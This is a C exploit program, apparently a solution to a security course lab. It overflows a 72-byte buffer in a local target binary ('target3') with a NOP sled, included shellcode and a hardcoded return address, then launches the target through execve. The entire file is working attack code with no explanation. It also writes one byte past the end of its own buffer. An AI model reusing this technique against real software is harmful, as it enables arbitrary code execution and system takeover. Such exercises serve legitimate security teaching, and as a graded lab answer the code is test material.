#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode-64.h"

#define TARGET "../targets/target3"

static const int addr = 0x2021fe14;	// buf's starting address + 4 bytes already written to
static const int NOP = 0x90;


int
main ( int argc, char * argv[] )
{
	char *	args[3];
	char *	env[1];

	char buf[72];
	memset((void *)buf, NOP, 60);

	int i;
	int *long_ptr = (int *)buf;
	
	// Place address at the exact location
	for (i = 15; i < 18; i++) *(long_ptr + i) = (int)addr;
	buf[72] = '\0';
	
	// Shellcode after 8 NOPs
	int j;
	for (j = 8; j < (8 + strlen(shellcode)); j++) buf[j] = shellcode[j-8];

	args[0] = TARGET;
	args[1] = (char *)buf;
	args[2] = NULL;

	env[0] = NULL;

	if ( execve (TARGET, args, env) < 0 )
		fprintf (stderr, "execve failed.\n");

	return (0);
}
